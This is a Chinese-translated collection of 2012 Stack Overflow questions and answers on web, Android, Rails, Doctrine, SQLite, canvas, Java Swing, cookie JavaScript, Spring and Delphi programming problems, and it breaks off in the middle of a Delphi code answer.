我使用 jQuery Tools v1.2.5，它在 Resin Web 服务器上运行。有什么问题？

网络服务器响应`image/jpeg`；但是有什么问题`XMLHttpRequest`吗？

```
$('.overlay-trigger').each(function(i) {

        $(this).overlay({
            top: '10%',
            left: 'center',
            oneInstance: true,
            closeOnClick: true,
            onBeforeLoad: function() {
                var wrapper = this.getOverlay().find(".content-wrapper");
                console.log(wrapper);
                var contentRef = this.getTrigger().attr("href");
                var $content = $(contentRef + " > *");

                if ($content.length > 0) {
                    // Load from DOM tree
                    wrapper.html($content.clone())
                }
                else {
                    // Load data from HTTP request/response
                    console.log("LOADING IMAGE");
                    wrapper.load(contentRef);
                }
            },
            onLoad: function() {
                console.log("onLoad");
                var targetOverlay = this.getTrigger().attr("rel");

                // If local controllers exist, append them to the target overlay controller.
                if ($("#local-overlay-controllers > *")) {
                    $("#local-overlay-controllers > *").appendTo(targetOverlay + " > .overlay-controllers");
                }

                $(targetOverlay + " .overlay-confirm").click(function() {
                    $(".overlay-trigger:eq(" + i + ")").overlay().close();
                });

                $(targetOverlay + " .close-overlay").click(function() {
                    // If we have multiple overlay triggers on the same page sharing the
                    // same #overlay, we must make sure we close the one with the correct reference.
                    $(".overlay-trigger:eq(" + i + ")").overlay().close();
                });
            },
            onClose: function() {

                console.log("onClose");
                // Make sure we remove all content from the overlay controllers in case we reuse it.
                //var targetOverlay = this.getTrigger().attr("rel");
                //$(targetOverlay + " > .content-wrapper, #overlay > .overlay-controllers").empty();
            }
        });
    }) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T14:33:03.940

我找到了答案。图片数据直接写入div，没有img标签。一旦我有了一个 Img-tag，它就可以正常工作了。

# android - Android 从 URL 播放视频

> ID：10597800
> 
> 赞同：2
> 
> 时间：2012-05-15T09:25:35.683
> 
> 标签：android

当我从 sdcard 和原始文件夹播放视频时，视频播放正常。但是，当我从远程服务器 URL 播放视频时，它没有使用 VideoView 播放，可能是什么原因？

我必须连续播放视频，而不需要从基于 URL（服务器命中）的停止/暂停。

请帮我解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:38:59.023

```
String SrcPath="http://akamedia2.lsops.net/live/smil:cnbc_en.smil/playlist.m3u8";
        myVideoView = new VideoView(this);
        myVideoView.setVideoURI(Uri.parse(SrcPath));
        setContentView(myVideoView);
        myVideoView.setMediaController(new MediaController(this)); 
```

试试这个代码。跳它对你有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T09:28:05.623

MediaPlayer可以播放的协议和媒体文件格式有要求。

如果您还没有这样做，您需要参考此图表： [https ://developer.android.com/guide/appendix/media-formats.html](https://developer.android.com/guide/appendix/media-formats.html)

# ruby-on-rails - 如何使用其他模型的数据更新主页

> ID：10597809
> 
> 赞同：-1
> 
> 时间：2012-05-15T09:25:57.577
> 
> 标签：ruby-on-rails, ruby-on-rails-3, view, controller

目前我的主页显示来自不同模型的数据，这些模型是文章、论坛。

我编写的代码显示了来自不同模型的数据，但不是根据创建它们的日期和时间。我的意思是文章中的数据是根据日期和时间显示的，与民意调查相同，但不是作为一个整体，即如果一篇文章是在民意调查之前创建的，那么它不会在民意调查之前显示。

这是因为我在 poll 之后编写了文章代码，并且在控制器中我使用不同的变量从不同的模型中检索数据，并且在视图中我正在循环这些变量，如下所示。

这个主页的控制器代码是

```
def index
  @col     = Education.select(:college_id).where(user_id: @current_user.id).all
  @users   = Education.select(:user_id).where(college_id: @col.collect(&:college_id)).all 

  @poll    = Poll.where(created_by: @users.collect(&:user_id)).all
  @article = Article.where(user_id: @users.collect(&:user_id)).all

end 
```

在索引视图页面中，我编写了以下代码

```
 - unless @poll.empty?
            -  @poll.reverse.each do | poll|
                #statusbox
                    .imgbox
                        - if User.find(poll.created_by).basic_info
                            - if User.find(poll.created_by).basic_info.profilephoto?
                                = image_tag User.find(poll.created_by).basic_info.profilephoto.url(:thumb)
                            - else
                                %span no img
                        - else
                            %span no img
                    #welcomeheader

                        %span.bl=User.find(poll.created_by).first_name
                        posted a poll
                        %span.bl= time_ago_in_words(poll.created_at)  
                        ago

                        %p=link_to poll.name,poll

                %br

        - unless @article.empty?
            -  @article.reverse.each do | article|
                #statusbox
                    .imgbox
                        - if User.find(article.user_id).basic_info
                            - if User.find(article.user_id).basic_info.profilephoto?
                                = image_tag User.find(article.user_id).basic_info.profilephoto.url(:thumb)
                            - else
                                %span no img
                        - else
                            %span no img
                    #welcomeheader

                        %span.bl=User.find(article.user_id).first_name
                        posted an article
                        %span.bl= time_ago_in_words(article.created_at)  
                        ago

                        %p=link_to article.name,article

                %br 
```

**有没有一种方法可以存储来自这些不同模型的数据并将其存储在单个变量中并通过它进行循环，或者任何其他方式可以在单个视图中显示来自其他模型的更新日期和时间**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:37:41.207

正如我在您的代码中看到的那样，对于所有 4 个模型，您都显示相同类型的数据，为此您可以创建一个无表模型

```
class PostWrapper
    store_in nil
    belongs_to :user, :inverse_of => nil

    field :created_at, type: Time
    field :content, type: String
    filed :post_type, type: String
    and all other fields
end 
```

您可以为这些模型的对象分配值并在视图中使用它

或者

如果您的所有 4 个模型都有一些共同的属性和行为，那么您可以尝试 STI（单表继承）链接（http://code.alexreisner.com/articles/single-table-inheritance-in-rails.html ) 然后使用该表的对象并相应地在视图中使用它。

# database - 长度为 255 的 Doctrine2 列类型整数不适用于 DB

> ID：10597819
> 
> 赞同：1
> 
> 时间：2012-05-15T09:26:20.930
> 
> 标签：database, integer, doctrine-orm

我正在为我的数据库使用 Doctrine 2，我目前正在尝试为我的一个具有“整数”类型的列设置一个长度，但它似乎没有被采用。

```
/** @Column(type="integer", length=255) */
protected $number; 
```

当我检查我的数据库时，它仍然显示“int(11)”而不是“int(255)”。我没有发现任何人在谷歌上遇到过这个问题，或者我的关键字可能效果不佳。我见过一些人使用 length=XXX 而没有抱怨它的例子，所以我认为这是要走的路，但到目前为止还不好......

我总是丢弃/重建整个数据库和代理等，所以我怀疑它来自那里。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:31:21.283

这是因为你不能`INT`在 MySQL 中有这么大。

尝试改用该类型`BIGINT`，它从 -9223372036854775808 到 9223372036854775807（有符号）或从 0 到 18446744073709551615（无符号）。

教义版本：

```
/** @Column(type="bigint") */
protected $number; 
```

[手动的](http://dev.mysql.com/doc/refman/5.0/en/integer-types.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-01-30T07:51:27.350

经常看到这种误解。所以，澄清@meze（见上面的评论）。

`size`任何 MySQL 整数类型`display width`都与`ZEROFILL`.

对`ZEROFILL`列的选择会导致一个值至少在左侧填充`0`到该列的`size`/为止`display width`。

一个简单的例子来充分解释它。查看返回的输出。

```
CREATE TABLE `foo`
(
    `col_1`    INT(1),
    `col_1_Z`  INT(1) ZEROFILL,
    `col_11`   INT(11),
    `col_11_Z` INT(11) ZEROFILL
);

INSERT INTO `foo`
VALUES
    (42, 42, 42, 42);

SELECT
    col_1,
    col_1_Z,
    col_11,
    col_11_Z
FROM
    `foo`;

/* returned output */

|       col_1 |     col_1_Z |      col_11 |    col_11_Z |
|-------------|-------------|-------------|-------------|
|          42 |          42 |          42 | 00000000042 | 
```

# php - IE7上传进度

> ID：10597821
> 
> 赞同：0
> 
> 时间：2012-05-15T09:26:41.430
> 
> 标签：php, javascript, html

你们中有人知道在 Internet Explorer 中显示上传进度的方法吗？我目前正在使用 Ajax 上传器，我只需要一个简单的上传进度显示。（上传本身在 IE 中有效，但我需要一个进度......一个百分比会很棒......）

任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:28:13.600

在旧的 IE 浏览器中，如果不使用服务器端 hack 和附加请求来更新状态，或者例如基于 flash/java 的上传器，您就无法做到这一点。

# c# - SqlLite C# 更新速度极慢

> ID：10597823
> 
> 赞同：2
> 
> 时间：2012-05-15T09:26:44.613
> 
> 标签：c#, sqlite, executenonquery, journal

我真的很难解决这个问题。当我使用以下代码更新我的数据库以获取大量记录时，它的运行速度非常慢。我有 500,000 条记录要更新，这需要将近一个小时。在此操作期间，日志文件增长缓慢，主 SQLite db3 文件几乎没有变化 - 这是正常的吗？

仅当我有大量记录或要更新的记录时，该操作似乎才成为问题 - 它几乎可以立即在较少数量的记录上运行。

在此代码运行之前，对数据库执行了一些其他操作，那么它们可能会占用数据库吗？我试图确保所有其他连接都正确关闭。

感谢您的任何建议

```
using (SQLiteConnection sqLiteConnection = new SQLiteConnection("Data Source=" + _case.DatabasePath))
{
    sqLiteConnection.Open();
    using (SQLiteCommand sqLiteCommand = new SQLiteCommand("begin", sqLiteConnection))
    {
        sqLiteCommand.ExecuteNonQuery();
        sqLiteCommand.CommandText = "UPDATE CaseFiles SET areaPk = @areaPk, KnownareaPk = @knownareaPk WHERE mhash = @mhash";
        var pcatpk = sqLiteCommand.CreateParameter();
        var pknowncatpk = sqLiteCommand.CreateParameter();
        var pmhash = sqLiteCommand.CreateParameter();
        pcatpk.ParameterName = "@areaPk";
        pknowncatpk.ParameterName = "@knownareaPk";
        pmhash.ParameterName = "@mhash";
        sqLiteCommand.Parameters.Add(pcatpk);
        sqLiteCommand.Parameters.Add(pknowncatpk);
        sqLiteCommand.Parameters.Add(pmhash);
        foreach (CatItem CatItem in _knownFiless)
        {

            if (CatItem.FromMasterHashes == true)
            {
                pcatpk.Value = CatItem.areaPk;
                pknowncatpk.Value = CatItem.areaPk;
                pmhash.Value = CatItem.mhash; 
            }
            else
            {
                pcatpk.Value = CatItem.areaPk;
                pknowncatpk.Value = null;
                pmhash.Value = CatItem.mhash; 
            }
            sqLiteCommand.ExecuteNonQuery();
        }
        sqLiteCommand.CommandText = "end";
        sqLiteCommand.ExecuteNonQuery();
        sqLiteCommand.Dispose();
        sqLiteConnection.Close();
    }
    sqLiteConnection.Close();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:35:44.713

首先要确保您在 mhash 上有一个索引。将命令分组。使用多个线程。

或 [插入]

将记录批量导入临时表。在 mhash 列上创建索引。执行单个更新语句来更新记录。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T09:34:13.250

这部分肯定是你的问题。

```
foreach (CatItem CatItem in _knownFiless)
{
....
     sqLiteCommand.ExecuteNonQuery();
} 
```

您正在循环 List(?) 并对数据库执行查询。这不是一个好方法。因为数据库调用非常昂贵。因此，您可能会考虑使用另一种方式来更新这些项目。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T11:48:35.200

您需要将所有内容包装在事务中，否则我相信 SQLite 会为每次更新创建并提交一个事务......因此速度很慢。您清楚地知道查看您的代码，但我不确定在这里使用“开始”和“结束”命令会达到相同的结果，您可能会在开始和结束时得到空事务，而不是一个包装所有内容的事务。尝试这样的事情，以防万一：

```
 using (SQLiteTransaction mytransaction = myconnection.BeginTransaction())
  {
    using (SQLiteCommand mycommand = new SQLiteCommand(myconnection))
    {
      SQLiteParameter myparam = new SQLiteParameter();

      mycommand.CommandText = "YOUR QUERY HERE";
      mycommand.Parameters.Add(myparam);

      foreach (CatItem CatItem in _knownFiless)
      {
        ...
        mycommand.ExecuteNonQuery();
      }
    }
    mytransaction.Commit();
  } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T09:37:19.163

SQL 代码似乎没问题。C# 代码没有错，但它有一些冗余（不需要显式关闭/处置，因为您已经在使用`using`）。

_knownFiles 上有一个 for 循环（用 double s 表示？），它可能运行缓慢吗？在 for 循环中针对 DB 运行查询是不常见的，您应该使用相应的参数集创建查询。考虑到（尤其是在哈希上没有索引）您将执行 n * m 操作（n 是 for 循环的运行计数，m 是表大小）。

考虑到 m 大约为 500k，并假设 m = n 您将获得 250,000,000,000 次操作。这可能会持续一个小时。

据我所知，以前的连接或操作应该没有影响。

您还应该确保数据库的内部结构不会引起问题。是否存在受此操作影响的复合索引？任何外键/复杂的约束？

# html - 内联 SVG 与嵌入或 iframe 的性能问题

> ID：10597826
> 
> 赞同：5
> 
> 时间：2012-05-15T09:27:00.493
> 
> 标签：html, svg

我有两个 SVG 图像，它们总共有大约 8000 行，并且由几个带有渐变的形状组成。没有图案、过滤器、文本，只有带有笔触、简单或渐变填充的基本图形元素。

目前它们在生成 HTML 时被内联注入，因此源代码变得非常庞大。这是否会降低动画的性能，因此最好以不同的方式嵌入 svg？

嵌入 svg 时是否有一般的经验法则？

问候菲利普

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-02T14:23:52.263

如果您使用 HTML5 SVG 标签嵌入 SVG 内联，这不仅会增加 html 文件的大小，还会让 DOM 和您的浏览器渲染器保持忙碌。

如果您使用 iframe，您实际上并不知道它何时被加载或呈现，至少不是所有浏览器都如此。

HTML5 为您提供 JavaScript，这可能是解决方案。只需等待主体[加载](http://www.w3schools.com/jsref/event_onload.asp)，然后注入 SVG。

您可以使用[body-onLoad](http://www.w3schools.com/jsref/event_onload.asp)或 jQueries [ready()-funktion](http://api.jquery.com/ready/)

以下是它在 jQuery 中的实现方式：

```
<!DOCTYPE html>
<html>
<body>
<div id="svg-01" class="placeholder"></div>
<script src="path/to/jQuery.js"></script>
<script>
$(document).ready(function(){
    $("#svg-01").replaceWith('<svg><!--// some svg //--></svg>');
    });
</script>
</body>
</html> 
```

我什至会更进一步，而是使用 iframe 和[gziped SVG 替换它，如此处所述。](http://www.w3.org/TR/SVG/minimize.html)

# javascript - 强制画布更新

> ID：10597827
> 
> 赞同：3
> 
> 时间：2012-05-15T09:27:04.283
> 
> 标签：javascript, html, canvas

有没有办法强制画布更新？我想显示一条加载消息，但游戏在显示之前锁定了加载。我觉得我需要在调用加载函数之前告诉画布“立即绘制”，但也许还有另一种方法......

编辑：

好的，为了清楚起见，我写了一个非常小的脏脚本（我可以在茶歇时做的最好的事情：P）来展示我想要克服的东西。这里：

```
<html>
<head>
    <title>test page</title>
</head>

<body onload="init();">
    <canvas id="cnv" width="300" height="300">
        canvas not supported.<br/>
    </canvas>
</body>
</html>

<script type="text/javascript">  

    var ctx;

        function init()
    {
        var canvas = document.getElementById('cnv');
        ctx = canvas.getContext('2d');

        ctx.fillStyle = "rgb(255, 0, 0)";
        ctx.fillRect(0,0,300,300);

        FakeLoad();

        ctx.fillStyle = "rgb(0, 255, 0)";
        ctx.fillRect(0,0,300,300);
    }

    function FakeLoad()
    {
        var d = new Date();
        var start = d.getTime();

        while (new Date().getTime() - start < 5000)
        {
            //emulate 5 secs of loading time
        }
    }
</script> 
```

现在的想法是脚本应该绘制一个红色方块以显示其“正在加载”，并在完成后绘制一个绿色方块。但是，如果将其复制到 html 文件中，您将看到的只是 5 秒的暂停，然后出现绿色，而不是红色。在我的脑海中，我想要一些命令，比如 ctx.Refresh(); 在我画出绿色方块告诉它“现在更新！不要等待！”之后 但从回复来看，这不是处理问题的方法。

我应该怎么办？:)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T12:42:04.500

在执行较长任务之前，您可以做的另一件事是允许画布显示，即在短暂超时后开始 FakeLoad：

```
 var canvas = document.getElementById('cnv');
    ctx = canvas.getContext('2d');

    ctx.fillStyle = "rgb(255, 0, 0)";
    ctx.fillRect(0,0,300,300);

    setTimeout(function() {
      FakeLoad();

      ctx.fillStyle = "rgb(0, 255, 0)";
      ctx.fillRect(0,0,300,300);
    }, 20); // 20 ms - should be enough to draw something simple 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T10:14:14.200

如果我对您的理解正确，则无法以与您可以在 WPF 中重新渲染/绘制或重新流动 HTML DOM 相同的方式更新画布。

这是因为画布使用中间模式图形。本质上，画布唯一保留知识的是构成画布的像素。当您调用 draw rect 或 draw line 时，构成矩形或线条的像素被添加到画布中，就画布而言，它忘记了所有关于 draw rect 或 draw circle 调用，因此我们无法刷新画布并得到相同的结果。

如果您正在寻找“保留”渲染到其中的图形知识的东西，您可以尝试 SVG，它使用保留模式图形。本质上，它有自己的 DOM（对象的层次结构（圆形、矩形等）），每次区域变脏时都会重新渲染。

总之，这个页面非常适合帮助你理解即时模式图形和保留模式图形的区别：http: [//msdn.microsoft.com/en-us/library/ie/gg193983(v=vs.85)。 aspx](http://msdn.microsoft.com/en-us/library/ie/gg193983(v=vs.85).aspx)

说了这么多，如果我误解了你的问题，请接受我的道歉！

**更新**

从问题中的额外信息，

你永远看不到绿色方块的原因是因为主 javascript 线程总是忙于你的五秒循环。它从来没有时间更新 UI。为了让画布有时间随着加载屏幕更新，您需要异步完成所有加载。

你会做什么样的加载？如果是图像等，您可以使用[$.ajax](http://api.jquery.com/jQuery.ajax/ "$.ajax")和[jQuery](http://jquery.com/ "jQuery")来获取它们。这将从它们的位置异步获取图像，一旦检索到最后一张图像，您就可以使用您的内容清除并重新绘制画布。

我猜是这样的：

```
<script type="text/javascript">  

    var ctx;

    function init()
    {
        var canvas = document.getElementById('cnv');
        ctx = canvas.getContext('2d');

        ctx.fillStyle = "rgb(255, 0, 0)";
        ctx.fillRect(0,0,300,300);

        FakeLoad(); 
    }

    function FakeLoad()
    {
        $.ajax({
          url: "www.foo.com/bar.jpg",
          success: function(data)
          {
              // Do something with the data (persist it)
              RenderApp();
          }
        });
    }

    function RenderApp()
    {
        // Rendering the rest of the application / game
        ctx.fillStyle = "rgb(0, 255, 0)";
        ctx.fillRect(0,0,300,300);
    }

</script> 
```

显然这是一种伪代码，但希望它能给你一些想法！

如果您需要任何澄清，请告诉我！

# c++ - 从哪里获取 Explorerframe.lib？

> ID：10597828
> 
> 赞同：1
> 
> 时间：2012-05-15T09:27:05.563
> 
> 标签：c++, winapi, windows-7

我需要这个库来访问新的 Windows 7 任务栏功能。但是，它似乎没有与我拥有的 Microsoft SDK 一起安装。有人知道我在哪里可以得到这个图书馆吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T05:48:18.603

事实证明 Explorerframe.lib 不需要使用任务栏功能。正如 Raymond Chen 在评论中提到的，这些功能可以通过 COM 获得。

# java - 改进 Ubuntu 12.04 (GTK) 下的 JFileChooser

> ID：10597831
> 
> 赞同：5
> 
> 时间：2012-05-15T09:27:12.893
> 
> 标签：java, swing, ubuntu, jfilechooser, filedialog

我`JFileChooser`在 Ubuntu 12.04 下遇到问题。我使用此代码来设置外观： `javax.swing.UIManager.setLookAndFeel(javax.swing.UIManager.getSystemLookAndFeelClassName());`

它看起来像这样。用起来很不舒服，而且看起来很丑：

[![在此处输入图像描述](../Images/93e305ba0f257c2f86e39bf1263f1fba.png)](https://i.stack.imgur.com/wMOxV.png)
[（来源：[picfront.org](http://www9.picfront.org/token/9sRH/2012/05/15/2062476.jpg)）]

我希望它看起来像这样：

[![在此处输入图像描述](../Images/ce95bc569f4ec4c17dca54fb6f82f854.png)](https://i.stack.imgur.com/wTlBx.png)
[（来源：[picfront.org](http://www4.picfront.org/token/1lpa/2012/05/15/2062477.jpg)）]

使用这篇[文章](https://stackoverflow.com/questions/4983575/is-there-a-way-to-improve-jfilechooser-look-and-feel-under-ubuntu)中的提示，我尝试使用`FileDialog`而不是`FileChooser`. 但是当我在模式下启动它并单击“打开”按钮`FileDialog`时会引发异常。`LOAD`我创建对话框的方式：

```
FileDialog fd = new FileDialog(frame, "Test", FileDialog.LOAD);
fd.setVisible(true); 
```

例外：

```
Exception in thread "Thread-0" java.lang.NullPointerException
at sun.awt.X11.GtkFileDialogPeer.setFileInternal(GtkFileDialogPeer.java:79)
at sun.awt.X11.GtkFileDialogPeer.run(Native Method)
at sun.awt.X11.GtkFileDialogPeer.showNativeDialog(GtkFileDialogPeer.java:172)
at sun.awt.X11.GtkFileDialogPeer.access$000(GtkFileDialogPeer.java:39)
at sun.awt.X11.GtkFileDialogPeer$1.run(GtkFileDialogPeer.java:114) 
```

我在带有 Gnome 3 的 Ubuntu Linux 12.04 下使用 Oracle JDK7（如果有帮助的话）。

有人知道我如何改善外观`JFileChooser`或使其`FileDialog`正常工作吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T19:31:00.657

我正在处理的 Java GUI 项目中遇到了同样的问题。我将它设置为使用“zenity”终端程序来调用 Linux/unix 系统上的本机文件选择器。请注意，此解决方案不需要导入任何额外的 Java 库（尽管您必须在 Linux 上安装 Zenity），并且在 Windows 上也可以正常工作：

```
private File fileSelection(boolean savemode) {
        String os = System.getProperty("os.name");
        File input = null;
        String zenity = "zenity --file-selection --title=Open";
        String filestring;
        if ((os.indexOf("nix")!=-1 || os.indexOf("nux")!=-1)) {
            //Use native Linux file selection.
            try {
                if (savemode) {
                    zenity ="zenity --file-selection --title=Save --save";
                }
                Process p = Runtime.getRuntime().exec(zenity);  
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));  
                StringBuffer sb = new StringBuffer();  
                String line;
                /*while ((line = br.readLine()) != null) {  
                  sb.append(line).append("\n");  
                } */
                sb.append(br.readLine());
                filestring = sb.toString();  
                if (filestring.equals("null")) {
                    return null;
                }
                System.out.println(filestring);
                input = new File(filestring);
            } catch (IOException e1) {
                // TODO Auto-generated catch block
                e1.printStackTrace();
            }
        } else {
            final JFileChooser fc = new JFileChooser();
            int returnVal;
            if (savemode) {
                returnVal = fc.showSaveDialog(fc);
            } else {
                returnVal = fc.showOpenDialog(fc);  
            }
            if (returnVal == JFileChooser.APPROVE_OPTION) {
                input = fc.getSelectedFile();
            }
        }
        return input;
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-29T17:34:21.603

只是为了完整起见，这里是[java-forum.org 线程](http://www.java-forum.org/awt-swing-swt/136248-jfilechooser-gtk-ubuntu-haesslich.html)，您在该线程中用德语发布了相同的问题。

用户 eRaaaa 发布了[此错误的修复程序，该错误](http://mail.openjdk.java.net/pipermail/awt-dev/2012-January/002154.html)随后在 bugs.sun.com 上变成了[错误报告，并得到了积极评价。](http://bugs.sun.com/view_bug.do?bug_id=7130662)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T11:27:19.557

NullPointerException 通常意味着您指向的东西不存在。我想您尝试指向的引用在运行时丢失了。

# php - 如何修复未定义的 javascript 错误？

> ID：10597834
> 
> 赞同：0
> 
> 时间：2012-05-15T09:27:25.727
> 
> 标签：php, javascript, cookies, setcookie

我对 Javascript 相当陌生，我想做的是在单击链接后立即设置 cookie。当我从链接返回上一页时，我希望页面自动刷新并通过颜色通知用户以显示他们刚刚单击的链接。我用这个例子来指导我[http://webdesign.about.com/od/cookies/a/aa083198.htm](http://webdesign.about.com/od/cookies/a/aa083198.htm)。但我仍然没有得到它。

下面的代码是我所拥有的。问题是，只要我点击链接，萤火虫就会出现错误“getLink not defined”。同样通过 Firefox 上的 Web 开发人员，即使我从 Html 调用它，我的 cookie 似乎实际上并没有被设置。我还展示了我的 Html 中调用该函数的最重要部分。

我在 setCookie 中的 videoId 是一个 php 变量，它在我的代码中的其他地方定义。如果有人能指出我正确的方向，我将不胜感激。谢谢！

```
 <head>
    <script language="text/javascript">
    var cookie_name = "watched";
        function setCookie(cookie_name,cookie_value)
        {

        if (document.cookie!="") {
           index = document.cookie.indexOf(cookie_name);
           } else {
            index = -1;
            }
            if (index == -1) {
              var finish = 7200;
              var cookie_value = videoId + "; expires=" + finish;
              document.cookie=cookie_name  + "=" + cookie_value;
              }         
            }

     function getLink(cookie_value) {     
       if (document.cookie) {
         index = document.cookie.indexOf(cookie_value);
             if (index != -1) {
             colorLinks;
              }
            else{
            //alert("No color");
             }

              }
            return colorLinks;
           }

     function colorLinks()
      {
        $('#' + videoId).css('background-color: pink'); 

      }
  </script>
  </head>
<body onLoad=window.refresh>
<div id="page">
echo '<a href="' . $link . '" onclick="setCookie(); return true;">' . $this->Links 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:38:19.723

这根本不符合逻辑：

```
function getLink(cookie_value) {  
  if (document.cookie) {
    index = document.cookie.indexOf(cookie_value);
    if (index != -1) {
      colorLinks; // you mean colorLinks(); ???
    }
    else {
      //alert("No color");
    }
  }
 // why return a function that sets color instead of just calling it?
  return colorLinks;
} 
```

幸运的是没有任何调用`window.refresh`（除非你自己创建它）或者你会永远循环

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:31:32.717

1.  在代码中我看不到在哪里`videoId`被赋予了一个值
2.  您无需调用该函数`setCookie(cookie_name,cookie_value);`来设置 cookie。

请阅读有关 cookie 的信息：[http ://www.quirksmode.org/js/cookies.html](http://www.quirksmode.org/js/cookies.html)

```
<script type = "text/javascript">
function createCookie(name,value,days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime()+(days*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
    }
    else var expires = "";
    document.cookie = name+"="+value+expires+"; path=/";
}

function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}

function eraseCookie(name) {
    createCookie(name,"",-1);
}
</script> 
```

# xml - 我想用另一个项目的 xml 和源运行 main() 加载 spring 上下文 xml

> ID：10597839
> 
> 赞同：2
> 
> 时间：2012-05-15T09:27:52.960
> 
> 标签：xml, spring, maven, main, context.xml

我有两个java项目。一个是main，另一个是导入项目到main。使用 Maven，我加载了两个项目的 spring 上下文 xml。但是如果我想在主项目下面执行但是，这个源不能加载导入项目的xml。请帮我。我想加载另一个项目的 spring 上下文 xml 和源代码。

```
public static void main(String[] args) {
    @SuppressWarnings("unused")
    ApplicationContext context= new ClassPathXmlApplicationContext("/spring/context-*.xml");
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T10:59:39.030

我认为您不能`*`在该特定路径中使用。您需要明确指定上下文文件，例如

```
ApplicationContext context= new ClassPathXmlApplicationContext(
    "/spring/context-a.xml",
    "/spring/context-b.xml"); 
```

# javascript - Rails 应用程序中的 Java 脚本或 jquery

> ID：10597847
> 
> 赞同：-2
> 
> 时间：2012-05-15T09:28:17.757
> 
> 标签：javascript, jquery, ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1

我有一个收藏选择

```
<%=f.collection_select :logic, @logics, :last, :first, :prompt => true%> 
```

现在我在这个下拉列表中只有 5 个值，并且在从列表中选择不同的值时，我想在这个下拉列表中显示不同的文本

就像我在这个集合下面有跨度选择是

```
 <td><span class="note" id="spanid1" >Select the logic type.</span></td> 
```

现在假设我们在下拉菜单中有 5 个不同的值是

A,B,C,D,E

当我们选择

span 中的一条消息是“此逻辑为您提供每日支出”

跨度中的 b 消息是“此逻辑将提供每日储蓄”

跨度中的 c 消息是“每日利润”等

现在我该怎么做，我们可以动态更改同一跨度中的值。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:33:24.000

你的意思是这样的：

```
var names = {
  A : "spend",
  B : "saving",
  ..and so on
};
$("#yourSelectElement").change(function() {
  //$(this).val() will have A,B,C,D or E
  var spanText = "this logic will give " + names.$(this).val();
  $(".note").html(spanText);
}); 
```

# delphi - TButton 的下拉菜单

> ID：10597849
> 
> 赞同：8
> 
> 时间：2012-05-15T09:28:24.793
> 
> 标签：delphi, button, drop-down-menu, delphi-7

我正在尝试模拟一个 TButton 的下拉菜单，如下所示：

```
procedure DropMenuDown(Control: TControl; PopupMenu: TPopupMenu);
var
  APoint: TPoint;
begin
  APoint := Control.ClientToScreen(Point(0, Control.ClientHeight));
  PopupMenu.Popup(APoint.X, APoint.Y);
end;

procedure TForm1.Button1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
  if Button = mbLeft then
  begin
    DropMenuDown(Button1, PopupMenu1);
    // ReleaseCapture;
  end;
end; 
```

问题是，当菜单被下拉时，如果我再次单击该按钮，我希望菜单关闭，但它又会再次下拉。

我正在寻找**专门**针对通用 Delphi的解决方案，`TButton`而不是任何第 3 方等效解决方案。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-05-21T01:28:06.427

在查看了 Whiler & Vlad 提供的解决方案，并将其与 WinSCP 实现相同事物的方式进行比较后，我目前正在使用以下代码：

```
unit ButtonMenus;
interface
uses
  Vcl.Controls, Vcl.Menus;

procedure ButtonMenu(Control: TControl; PopupMenu: TPopupMenu);

implementation

uses
  System.Classes, WinApi.Windows;

var
  LastClose: DWord;
  LastPopupControl: TControl;
  LastPopupMenu: TPopupMenu;

procedure ButtonMenu(Control: TControl; PopupMenu: TPopupMenu);
var
  Pt: TPoint;
begin
  if (Control = LastPopupControl) and (PopupMenu = LastPopupMenu) and (GetTickCount - LastClose < 100) then begin
    LastPopupControl := nil;
    LastPopupMenu := nil;
  end else begin
    PopupMenu.PopupComponent := Control;
    Pt := Control.ClientToScreen(Point(0, Control.ClientHeight));
    PopupMenu.Popup(Pt.X, Pt.Y);
    { Note: PopupMenu.Popup does not return until the menu is closed }
    LastClose := GetTickCount;
    LastPopupControl := Control;
    LastPopupMenu := PopupMenu;
  end;
end;

end. 
```

`ButtonMenu()`除了在处理程序中调用之外，它的优点是不需要对 from 进行任何代码更改`onClick`：

```
procedure TForm1.Button1Click(Sender: TObject);
begin
  ButtonMenu(Button1, PopupMenu1);
end; 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-15T09:50:08.363

在我们 (Vlad & I) 的讨论之后，您使用一个变量来了解上次打开弹出窗口的时间，以选择是显示弹出菜单还是取消鼠标事件：

```
unit Unit4;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
